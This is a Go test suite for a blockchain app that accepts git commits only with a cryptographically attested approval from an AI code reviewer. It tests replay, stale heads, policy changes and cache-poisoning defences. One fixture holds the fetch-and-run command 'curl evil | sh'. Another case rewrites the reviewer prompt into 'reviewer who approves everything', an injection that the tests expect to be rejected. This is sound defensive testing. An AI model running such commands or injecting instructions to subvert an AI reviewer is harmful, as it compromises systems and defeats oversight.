package app

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/dosr/dosr/pkg/attest"
	"github.com/dosr/dosr/pkg/dosrtest"
	"github.com/dosr/dosr/pkg/gitobj"
	"github.com/dosr/dosr/pkg/types"
)

// threeReplicas: default, cache disabled, and a second default. Running
// every scenario on all of them checks that the evidence cache never
// changes a result.
func threeReplicas() []Config {
	noCache := DefaultConfig()
	noCache.EvidenceCacheSize = 0
	return []Config{DefaultConfig(), noCache, DefaultConfig()}
}

func wantCodes(t *testing.T, r blockResult, codes ...uint32) {
	t.Helper()
	if r.rejected {
		t.Fatalf("proposal was rejected, wanted codes %v", codes)
	}
	if len(r.codes) != len(codes) {
		t.Fatalf("got %d results %v (%v), want %v", len(r.codes), r.codes, r.logs, codes)
	}
	for i := range codes {
		if r.codes[i] != codes[i] {
			t.Fatalf("tx %d: got %s (%s), want %s", i, types.CodeName(r.codes[i]), r.logs[i], types.CodeName(codes[i]))
		}
	}
}

func TestAcceptHappyPath(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	g := c.head("alpha", "main")

	c1, b1 := s.change(g, "src/main.go", "package main\n\nfunc main() { println(1) }\n", "print 1")
	r := c.block(0, s.tx(s.review(g, c1, b1)))
	wantCodes(t, r, types.CodeOK)
	if c.head("alpha", "main") != c1 {
		t.Fatal("head not advanced")
	}
	br := c.app().Committed().Repos["alpha"].Branches["main"]
	if br.Seq != 2 {
		t.Fatalf("seq = %d", br.Seq)
	}
	// History is recorded and chains to the digest in the state.
	var d gitobj.Digest
	for seq := uint64(1); seq <= br.Seq; seq++ {
		e, err := c.app().History("alpha", "main", seq)
		if err != nil || e == nil {
			t.Fatalf("history %d: %v", seq, err)
		}
		d = ChainDigest(d, e)
	}
	if d != br.HistDigest {
		t.Fatal("history digest mismatch")
	}
	// Objects are retrievable from the committed store.
	if !c.app().Objects("alpha").Has(c1) {
		t.Fatal("candidate commit not stored")
	}
}

// TestConcurrentProposals is the scenario from the design document: two
// contributors obtain approvals for different commits on the same head.
// Consensus orders them; the second is stale and must be re-reviewed
// after a rebase.
func TestConcurrentProposals(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")

	c1, b1 := s.change(h, "a.txt", "from alice\n", "alice")
	c2, b2 := s.change(h, "b.txt", "from bob\n", "bob")
	tx1, tx2 := s.tx(s.review(h, c1, b1)), s.tx(s.review(h, c2, b2))

	// Same block, honest proposer: only the first is included.
	r := c.block(0, tx1, tx2)
	wantCodes(t, r, types.CodeOK)
	if c.head("alpha", "main") != c1 {
		t.Fatal("head should be c1")
	}
	// The loser retries verbatim: stale, the honest proposer drops it.
	r = c.block(1, tx2)
	wantCodes(t, r)
	// A Byzantine proposer includes it anyway: strict validators reject
	// the proposal.
	if r = c.rawBlock(tx2); !r.rejected {
		t.Fatal("stale transaction in a proposal must be rejected")
	}
	// If it is decided regardless (block sync), it fails without effect.
	r = c.forcedBlock(tx2)
	wantCodes(t, r, types.CodeStaleHead)
	if c.head("alpha", "main") != c1 {
		t.Fatal("stale transaction changed the head")
	}
	// Rebase + new review succeeds.
	s.adopt("a.txt", "from alice\n")
	c2r, b2r := s.change(c1, "b.txt", "from bob\n", "bob (rebased)")
	r = c.block(2, s.tx(s.review(c1, c2r, b2r)))
	wantCodes(t, r, types.CodeOK)
	if c.head("alpha", "main") != c2r {
		t.Fatal("head should be the rebased commit")
	}
}

// TestChainedInOneBlock: a commit and its child can be accepted in the
// same block; the second verifies against objects the first added.
func TestChainedInOneBlock(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	c1, b1 := s.change(h, "a.txt", "1\n", "one")
	s.adopt("a.txt", "1\n")
	c2, b2 := s.change(c1, "a.txt", "1\n2\n", "two")
	r := c.block(0, s.tx(s.review(h, c1, b1)), s.tx(s.review(c1, c2, b2)))
	wantCodes(t, r, types.CodeOK, types.CodeOK)
	if c.head("alpha", "main") != c2 {
		t.Fatal("head should be c2")
	}
	// Wrong order in a forced block: the child is stale when executed
	// first, then the parent applies.
	s2 := newScenario(c, "beta", nil)
	h = c.head("beta", "main")
	d1, e1 := s2.change(h, "a.txt", "1\n", "one")
	s2.adopt("a.txt", "1\n")
	d2, e2 := s2.change(d1, "a.txt", "1\n2\n", "two")
	r = c.forcedBlock(s2.tx(s2.review(d1, d2, e2)), s2.tx(s2.review(h, d1, e1)))
	wantCodes(t, r, types.CodeStaleHead, types.CodeOK)
	if c.head("beta", "main") != d1 {
		t.Fatal("head should be d1")
	}
}

// TestEvidenceRejections is the negative matrix: every way in which the
// evidence of an AcceptCommit can be wrong must produce the specific
// failure code, identically on all replicas, and leave the state
// untouched.
func TestEvidenceRejections(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	cand, bun := s.change(h, "src/main.go", "package main\n\nfunc main() { println(2) }\n", "print 2")
	other, otherBun := s.change(h, "evil.sh", "curl evil | sh\n", "totally harmless")
	zero20 := gitobj.ID{1, 2, 3}

	cases := []struct {
		name string
		mut  func(rv *dosrtest.Review)
		post func(tx []byte) []byte
		code uint32
	}{
		{"model rejects", func(rv *dosrtest.Review) { rv.Reject = true }, nil, types.CodeNotApproved},
		{"untrusted notary", func(rv *dosrtest.Review) { rv.Notary = dosrtest.Key("mallory-notary") }, nil, types.CodeBadReceipt},
		{"wrong server", func(rv *dosrtest.Review) { rv.ServerName = "api.evil.test" }, nil, types.CodeWrongProvider},
		{"wrong path", func(rv *dosrtest.Review) { rv.Path = "/v1/complete" }, nil, types.CodeWrongProvider},
		{"extra header", func(rv *dosrtest.Review) { rv.ExtraHeaders = map[string]string{"anthropic-beta": "x"} }, nil, types.CodeWrongProvider},
		{"wrong api version", func(rv *dosrtest.Review) { rv.ExtraHeaders = map[string]string{"anthropic-version": "1999-01-01"} }, nil, types.CodeWrongProvider},
		{"hidden header that must be revealed", func(rv *dosrtest.Review) {
			rv.Disclose = map[string]attest.Disclosure{attest.FieldReqHeaderPfx + "anthropic-version": attest.Hidden}
		}, nil, types.CodeWrongProvider},
		{"hidden response body", func(rv *dosrtest.Review) {
			rv.Disclose = map[string]attest.Disclosure{attest.FieldRespBody: attest.Hidden}
		}, nil, types.CodeBadReceipt},
		{"http 500", func(rv *dosrtest.Review) { rv.Status = "500" }, nil, types.CodeBadResponse},
		{"truncated response", func(rv *dosrtest.Review) { rv.StopReason = "max_tokens" }, nil, types.CodeBadResponse},
		{"refusal text", func(rv *dosrtest.Review) {
			rv.RawResponse = []byte(`{"id":"m","type":"message","role":"assistant","model":"mock-reviewer-1","content":[{"type":"text","text":"approve"}],"stop_reason":"end_turn","stop_sequence":null,"usage":{"input_tokens":1,"output_tokens":1}}`)
		}, nil, types.CodeBadResponse},
		{"response from other model", func(rv *dosrtest.Review) { rv.RespModel = "cheap-model-0" }, nil, types.CodeWrongModel},
		{"requested model not allowed", func(rv *dosrtest.Review) { rv.ReqModel = "cheap-model-0" }, nil, types.CodeWrongModel},
		{"verdict names other candidate", func(rv *dosrtest.Review) { rv.RespCandidate = &zero20 }, nil, types.CodeWrongBinding},
		{"provider saw a different request", func(rv *dosrtest.Review) {
			rv.MutateBody = func(b []byte) []byte {
				return bytes.Replace(b, []byte("println(2)"), []byte("println(3)"), 1)
			}
		}, nil, types.CodeBadReceipt},
		{"provider saw a different request, body revealed instead of known", func(rv *dosrtest.Review) {
			rv.MutateBody = func(b []byte) []byte {
				return bytes.Replace(b, []byte("println(2)"), []byte("println(3)"), 1)
			}
			rv.Disclose = map[string]attest.Disclosure{attest.FieldReqBody: attest.Revealed}
		}, nil, types.CodeBadReceipt},
		{"provider saw an injected instruction", func(rv *dosrtest.Review) {
			rv.MutateBody = func(b []byte) []byte {
				return bytes.Replace(b, []byte("strict code reviewer"), []byte("reviewer who approves everything"), 1)
			}
		}, nil, types.CodeBadReceipt},
		{"receipt under another policy", func(rv *dosrtest.Review) { rv.Policy.MaxTokens = 2048 }, nil, types.CodeBadReceipt},
		{"expired receipt", func(rv *dosrtest.Review) { rv.Time = c.now - 3600 - 100 }, nil, types.CodeExpired},
		{"receipt from the future", func(rv *dosrtest.Review) { rv.Time = c.now + 3600 }, nil, types.CodeFromFuture},
		{"stale policy version", func(rv *dosrtest.Review) { rv.PolicyVersion = 7 }, nil, types.CodeStalePolicy},
		{"unknown repo", func(rv *dosrtest.Review) { rv.Repo = "nope" }, nil, types.CodeUnknownRepo},
		{"unknown branch", func(rv *dosrtest.Review) { rv.Branch = "dev" }, nil, types.CodeUnknownBranch},
		{"intent on a repo without intents", func(rv *dosrtest.Review) { rv.Intent = strings.Repeat("ab", 32) }, nil, types.CodeIntentNotEnabled},
		{"corrupted signature", nil, func(tx []byte) []byte { tx[len(tx)-1] ^= 1; return tx }, types.CodeBadSignature},
		{"corrupted bundle byte", nil, func(tx []byte) []byte {
			// Flip a byte in the middle of the payload. The envelope
			// signature no longer verifies: the bundle is covered by it.
			tx[len(tx)-200] ^= 1
			return tx
		}, types.CodeBadSignature},
		{"truncated", nil, func(tx []byte) []byte { return tx[:len(tx)/2] }, types.CodeMalformed},
		{"garbage", nil, func(tx []byte) []byte { return []byte("not a transaction") }, types.CodeMalformed},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			before := c.app().Committed().ComputeAppHash()
			rv := s.review(h, cand, bun)
			if tc.mut != nil {
				tc.mut(&rv)
			}
			tx := append([]byte(nil), s.tx(rv)...)
			if tc.post != nil {
				tx = tc.post(tx)
			}
			// Mempool admission refuses it (time-dependent cases use
			// the wall clock in CheckTx, so we only require non-OK).
			if code := c.checkTx(0, tx); code == types.CodeOK {
				t.Fatalf("CheckTx admitted the transaction")
			}
			// An honest proposer leaves it out.
			wantCodes(t, c.block(0, tx))
			// Validators reject a proposal that contains it.
			if r := c.rawBlock(tx); !r.rejected {
				t.Fatal("proposal containing the transaction was accepted")
			}
			// Even if decided, it fails with the expected code...
			wantCodes(t, c.forcedBlock(tx), tc.code)
			// ...and changes nothing.
			if !bytes.Equal(before, c.app().Committed().ComputeAppHash()) {
				t.Fatal("failed transaction changed the state")
			}
			if c.head("alpha", "main") != h {
				t.Fatal("head moved")
			}
		})
	}

	// Evidence swapping: a genuine approval for one commit cannot be
	// attached to another commit.
	t.Run("receipt of another candidate", func(t *testing.T) {
		good, err := c.w.Receipt(s.review(h, cand, bun), s.git.Store)
		if err != nil {
			t.Fatal(err)
		}
		tx, err := types.SignTx(s.user, types.TxAcceptCommit, types.AcceptCommitBody{
			ChainID: testChain, Repo: "alpha", Branch: "main", ExpectedHead: h, Candidate: other,
			PolicyVersion: 1, Model: c.w.Model, Receipt: good,
		}, otherBun.Encode())
		if err != nil {
			t.Fatal(err)
		}
		wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeBadReceipt)
	})
	// Bundle swapping: the approved candidate ID with a bundle that does
	// not hash to it.
	t.Run("bundle of another candidate", func(t *testing.T) {
		good, _ := c.w.Receipt(s.review(h, cand, bun), s.git.Store)
		tx, err := types.SignTx(s.user, types.TxAcceptCommit, types.AcceptCommitBody{
			ChainID: testChain, Repo: "alpha", Branch: "main", ExpectedHead: h, Candidate: cand,
			PolicyVersion: 1, Model: c.w.Model, Receipt: good,
		}, otherBun.Encode())
		if err != nil {
			t.Fatal(err)
		}
		wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeBadBundle)
	})
	// Cross-repository replay: an approval obtained in repo alpha is not
	// valid for an identical change in repo beta.
	t.Run("receipt of another repository", func(t *testing.T) {
		s2 := newScenario(c, "alpha2", nil)
		// alpha2 has a different genesis (README differs), so craft the
		// replay against alpha's own objects: claim repo alpha2.
		good, _ := c.w.Receipt(s.review(h, cand, bun), s.git.Store)
		h2 := c.head("alpha2", "main")
		c2, b2 := s2.change(h2, "x", "y\n", "z")
		tx, _ := types.SignTx(s.user, types.TxAcceptCommit, types.AcceptCommitBody{
			ChainID: testChain, Repo: "alpha2", Branch: "main", ExpectedHead: h2, Candidate: c2,
			PolicyVersion: 1, Model: c.w.Model, Receipt: good,
		}, b2.Encode())
		wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeBadReceipt)
	})
	// Cross-chain replay.
	t.Run("transaction of another chain", func(t *testing.T) {
		w2 := dosrtest.NewWorld("other-chain")
		tx, err := w2.AcceptTx(s.user, s.review(h, cand, bun), s.git.Store)
		if err != nil {
			t.Fatal(err)
		}
		wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeWrongChain)
	})

	// After all that, the honest transaction still works.
	wantCodes(t, c.block(0, s.tx(s.review(h, cand, bun))), types.CodeOK)
}

// TestApiKeyNeverOnChain checks the confidentiality claim: the API key
// used for the review does not appear in the transaction.
func TestApiKeyNeverOnChain(t *testing.T) {
	c := newChain(t)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	cand, bun := s.change(h, "a", "b\n", "c")
	tx := s.tx(s.review(h, cand, bun))
	if bytes.Contains(tx, []byte("SECRET-KEY")) {
		t.Fatal("API key leaked into the transaction")
	}
}

func TestReplayAcceptedTransaction(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	c1, b1 := s.change(h, "a", "1\n", "one")
	tx := s.tx(s.review(h, c1, b1))
	wantCodes(t, c.block(0, tx), types.CodeOK)
	// Replays never apply: the head has moved on, and a Git history
	// cannot return to an earlier commit ID.
	wantCodes(t, c.block(0, tx))
	wantCodes(t, c.forcedBlock(tx, tx), types.CodeStaleHead, types.CodeStaleHead)
	if br := c.app().Committed().Repos["alpha"].Branches["main"]; br.Seq != 2 || br.Head != c1 {
		t.Fatalf("replay had an effect: %+v", br)
	}
}

func TestPolicyUpdate(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	c1, b1 := s.change(h, "a", "1\n", "one")
	// A review is obtained under policy v1 ...
	inFlight := s.tx(s.review(h, c1, b1))

	newPol := s.pol
	newPol.SystemPrompt = "Reject anything that touches CI configuration."
	m := c.w.Maintainers

	// Not enough approvals.
	tx, _ := c.w.UpdatePolicyTx(s.user, "alpha", 1, newPol, m[:1])
	wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeUnauthorized)
	// Approval by a non-maintainer.
	tx, _ = c.w.UpdatePolicyTx(s.user, "alpha", 1, newPol, append(m[:1:1], dosrtest.Key("outsider")))
	wantCodes(t, c.forcedBlock(tx.Bytes()), types.CodeUnauthorized)
	// Approvals for a different policy than the one in the transaction.
	other := newPol
	other.MaxTokens = 4096
	txo, _ := c.w.UpdatePolicyTx(s.user, "alpha", 1, other, m[:2])
	body, _ := txo.UpdatePolicy()
	body.Policy = newPol
	forged, _ := types.SignTx(s.user, types.TxUpdatePolicy, body, nil)
	wantCodes(t, c.forcedBlock(forged.Bytes()), types.CodeUnauthorized)

	// ... the policy changes while the review is in flight ...
	upd, _ := c.w.UpdatePolicyTx(s.user, "alpha", 1, newPol, m[:2])
	wantCodes(t, c.block(0, upd.Bytes()), types.CodeOK)
	// ... so the receipt no longer counts,
	wantCodes(t, c.forcedBlock(inFlight), types.CodeStalePolicy)
	// not even if the submitter lies about the version: the policy hash
	// is inside the attested request.
	lie := s.review(h, c1, b1)
	lie.PolicyVersion = 2
	wantCodes(t, c.forcedBlock(s.tx(lie)), types.CodeBadReceipt)
	// The update cannot be replayed.
	wantCodes(t, c.forcedBlock(upd.Bytes()), types.CodeStalePolicy)

	// A review under the new policy is accepted.
	s.pol, s.polVer = newPol, 2
	wantCodes(t, c.block(0, s.tx(s.review(h, c1, b1))), types.CodeOK)
}

func TestIntents(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", func(p *types.Policy) { p.RequireIntent = true; p.MaxAttempts = 2 })
	h := c.head("alpha", "main")
	c1, b1 := s.change(h, "a", "1\n", "one")

	// Without an intent the receipt is refused.
	wantCodes(t, c.forcedBlock(s.tx(s.review(h, c1, b1))), types.CodeIntentRequired)

	itx, _ := c.w.IntentTx(s.user, "alpha", "main", h, c1)
	r := c.block(0, itx.Bytes())
	wantCodes(t, r, types.CodeOK)
	in := c.app().Committed().Intents[itx.ID().String()]
	if in == nil || len(in.Nonce) != 16 {
		t.Fatalf("intent not registered: %+v", in)
	}

	// A receipt obtained BEFORE the intent (no/wrong nonce) is refused.
	rv := s.review(h, c1, b1)
	rv.Intent = itx.ID().String()
	wantCodes(t, c.forcedBlock(s.tx(rv)), types.CodeBadReceipt)
	rv.Nonce = bytes.Repeat([]byte{7}, 16)
	wantCodes(t, c.forcedBlock(s.tx(rv)), types.CodeBadReceipt)

	// An intent for another candidate cannot be borrowed.
	c2, b2 := s.change(h, "b", "2\n", "two")
	rv2 := s.review(h, c2, b2)
	rv2.Intent, rv2.Nonce = itx.ID().String(), in.Nonce
	wantCodes(t, c.forcedBlock(s.tx(rv2)), types.CodeIntentMismatch)

	// Attempts are bounded per submitter and head.
	i2, _ := c.w.IntentTx(s.user, "alpha", "main", h, c2)
	wantCodes(t, c.block(0, i2.Bytes()), types.CodeOK)
	c3, _ := s.change(h, "c", "3\n", "three")
	i3, _ := c.w.IntentTx(s.user, "alpha", "main", h, c3)
	wantCodes(t, c.forcedBlock(i3.Bytes()), types.CodeTooManyAttempts)

	// The honest flow.
	rv.Nonce = in.Nonce
	wantCodes(t, c.block(0, s.tx(rv)), types.CodeOK)
	st := c.app().Committed()
	if len(st.Intents) != 0 || len(st.Attempts) != 0 {
		t.Fatalf("intents not pruned after head change: %d intents, %d counters", len(st.Intents), len(st.Attempts))
	}
	// Intents for a stale head are refused.
	wantCodes(t, c.forcedBlock(i3.Bytes()), types.CodeStaleHead)
}

// TestRestartRecovers checks durability: a replica re-opened from its
// database has exactly the committed state, and re-executing a block
// whose Commit never happened gives the same result as on the replicas
// that did not crash.
func TestRestartRecovers(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")
	c1, b1 := s.change(h, "a", "1\n", "one")
	wantCodes(t, c.block(0, s.tx(s.review(h, c1, b1))), types.CodeOK)

	before, _ := json.Marshal(c.replicas[2].app.Committed())
	c.reopen(2)
	after, _ := json.Marshal(c.replicas[2].app.Committed())
	if !bytes.Equal(before, after) {
		t.Fatalf("state changed across restart:\n%s\n%s", before, after)
	}

	// Crash between FinalizeBlock and Commit on replica 2.
	s.adopt("a", "1\n")
	c2, b2 := s.change(c1, "a", "1\n2\n", "two")
	tx := s.tx(s.review(c1, c2, b2))
	crashed := c.replicas[2]
	c.replicas = c.replicas[:2]
	wantCodes(t, c.block(0, tx), types.CodeOK)
	// Replica 2 executed the block but died before Commit.
	ctx, bt := t.Context(), c.now
	if _, err := crashed.app.FinalizeBlock(ctx, finalizeReq(c.height, bt, tx)); err != nil {
		t.Fatal(err)
	}
	c.replicas = append(c.replicas, crashed)
	c.reopen(2)
	if got := crashed.app.Committed().Height; got != c.height-1 {
		t.Fatalf("uncommitted block survived the crash: height %d", got)
	}
	if crashed.app.Objects("alpha").Has(c2) {
		t.Fatal("objects of an uncommitted block are visible after restart")
	}
	// CometBFT replays the block.
	res, err := crashed.app.FinalizeBlock(ctx, finalizeReq(c.height, bt, tx))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := crashed.app.Commit(ctx, nil); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(res.AppHash, c.replicas[0].app.Committed().AppHash) {
		t.Fatal("replayed block produced a different app hash")
	}
	c.assertAgreement()
}

// TestCachePoisoning reproduces the attack of design log D3 and checks
// that the defence holds: evidence verified against uncommitted objects
// must not be reused in a context where those objects do not exist.
func TestCachePoisoning(t *testing.T) {
	c := newChain(t, threeReplicas()...)
	s := newScenario(c, "alpha", nil)
	h := c.head("alpha", "main")

	// Transaction A introduces blob X.
	const x = "shared blob content\n"
	cA, bA := s.change(h, "x.txt", x, "introduce x")
	txA := s.tx(s.review(h, cA, bA))

	// A second repository in the same world cannot see alpha's objects,
	// so the attack needs the same repository: T is a change on top of
	// cA whose bundle omits blob X's sibling... we build the variant that
	// is actually possible: T builds on cA (so it is only verifiable
	// where A's objects exist).
	s.adopt("x.txt", x)
	cT, bT := s.change(cA, "y.txt", "y\n", "needs A")
	txT := s.tx(s.review(cA, cT, bT))

	// The victim (replica 0) sees A then T in its mempool: both are
	// admitted, T verified against A's uncommitted objects.
	if code := c.checkTx(0, txA); code != types.CodeOK {
		t.Fatalf("A not admitted: %d", code)
	}
	if code := c.checkTx(0, txT); code != types.CodeOK {
		t.Fatalf("T not admitted: %d", code)
	}
	// A block decides T WITHOUT A. On every replica, including the
	// victim with its warm cache, T must fail. (chain.finalize asserts
	// that results and app hashes are identical across replicas.)
	r := c.forcedBlock(txT)
	wantCodes(t, r, types.CodeStaleHead)

	// Now the sharper variant: same head, so the state check passes and
	// only the evidence differs between a poisoned and a clean node. T2
	// is a root-level change whose bundle deliberately omits an object
	// that only exists in the victim's speculative store.
	s2 := newScenario(c, "beta", nil)
	h2 := c.head("beta", "main")
	// A2 (pending only on the victim) adds blob X to beta.
	cA2, bA2 := s2.change(h2, "x.txt", x, "introduce x")
	txA2 := s2.tx(s2.review(h2, cA2, bA2))
	// T2 adds the same blob X under another name, on the same head h2,
	// but ships a bundle without the blob.
	cT2, bT2 := s2.change(h2, "copy.txt", x, "copy of x")
	xID := gitobj.Object{Type: gitobj.TypeBlob, Data: []byte(x)}.ID()
	var stripped gitobj.Bundle
	for _, o := range bT2.Objects {
		if o.ID() != xID {
			stripped.Objects = append(stripped.Objects, o)
		}
	}
	if len(stripped.Objects) != len(bT2.Objects)-1 {
		t.Fatal("test setup: blob not found in bundle")
	}
	// The receipt is honest (the contributor has all objects).
	rc, err := c.w.Receipt(s2.review(h2, cT2, bT2), s2.git.Store)
	if err != nil {
		t.Fatal(err)
	}
	t2, _ := types.SignTx(s2.user, types.TxAcceptCommit, types.AcceptCommitBody{
		ChainID: testChain, Repo: "beta", Branch: "main", ExpectedHead: h2, Candidate: cT2,
		PolicyVersion: 1, Model: c.w.Model, Receipt: rc,
	}, stripped.Encode())

	if code := c.checkTx(0, txA2); code != types.CodeOK {
		t.Fatalf("A2 not admitted: %d", code)
	}
	// On the victim the check state has head cA2, so T2 (expecting h2)
	// is stale there. Force the evidence path directly instead: verify
	// T2 in a context that has A2's objects pending.
	ctx := c.replicas[0].app.speculate(modeProcess, c.height+1, timeAt(c.now))
	if r := c.replicas[0].app.exec(ctx, txA2); r.code != types.CodeOK {
		t.Fatalf("A2: %v", r.log)
	}
	// Put the branch back to h2 while keeping A2's objects pending -
	// exactly the store a multi-branch repository would have.
	br := ctx.st.Repos["beta"].Branches["main"]
	br.Head = h2
	ctx.st.Repos["beta"].Branches["main"] = br
	if r := c.replicas[0].app.exec(ctx, t2.Bytes()); r.code != types.CodeOK {
		t.Fatalf("T2 should verify where X is pending: %v", r.log)
	}
	// The block decides T2 alone. Without the defence the victim would
	// apply it from its cache and fork.
	wantCodes(t, c.forcedBlock(t2.Bytes()), types.CodeBadBundle)
	if c.head("beta", "main") != h2 {
		t.Fatal("incomplete bundle was accepted")
	}
}
